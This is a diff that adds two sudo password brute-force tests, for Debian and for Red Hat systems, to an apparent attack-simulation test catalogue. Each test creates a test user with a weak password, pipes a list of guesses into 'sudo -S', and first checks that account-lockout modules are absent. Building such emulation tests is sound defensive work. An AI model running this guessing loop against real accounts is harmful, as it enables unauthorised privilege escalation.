@@ -71,6 +71,7 @@ atomic_tests:
         }
       }
       Write-Host "End of bruteforce"
+
 - name: Brute Force Credentials of single Azure AD user
   auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
   description: |
@@ -115,3 +116,83 @@ atomic_tests:
         }
       }
       Write-Host "End of bruteforce"
+
+- name: SUDO brute force Debian
+  description: |
+    Brute force the password of a local user account which is a member of the sudo'ers group on a Debian based Linux distribution.  
+  supported_platforms:
+    - linux
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if running on a Debian based machine.
+    prereq_command: |
+      if grep -iq "debian\|ubuntu\|kali" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+      if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
+    get_prereq_command: |
+      apt-get update && apt-get install -y openssl sudo
+  executor:
+    elevation_required: true 
+    command: |
+      useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password) target
+      su target
+
+      PASSWORDS=(one two three password five); \
+          touch /tmp/file; \
+          for P in ${PASSWORDS[@]}; do \
+              date +"%b %d %T"; \
+              sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
+              echo "exit: $?"; \
+              if grep -q "root" /tmp/file; then \
+                  echo "FOUND: sudo => $P"; break; \
+              else \
+                  echo "TRIED: $P"; \
+              fi; \
+              sleep 2; \
+          done; \
+          rm /tmp/file
+    cleanup_command: |
+      userdel target
+    name: sh
+
+- name: SUDO brute force Redhat
+  description: |
+    Brute force the password of a local user account which is a member of the sudo'ers group on a Redhat based Linux distribution.  
+  supported_platforms:
+    - linux
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if running on a Redhat based machine.
+    prereq_command: |
+      if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "Redhat"; else echo "NOT Redhat"; exit 1; fi
+      if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
+    get_prereq_command: |
+      yum -y update && yum install -y openssl sudo
+  executor:
+    elevation_required: true 
+    command: |
+      useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password) target
+      su target
+
+      PASSWORDS=(one two three password five); \
+          touch /tmp/file; \
+          for P in ${PASSWORDS[@]}; do \
+              date +"%b %d %T"; \
+              sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
+              echo "exit: $?"; \
+              if grep -q "root" /tmp/file; then \
+                  echo "FOUND: sudo => $P"; break; \
+              else \
+                  echo "TRIED: $P"; \
+              fi; \
+              sleep 2; \
+          done; \
+          rm /tmp/file
+    cleanup_command: |
+      userdel target
+    name: sh
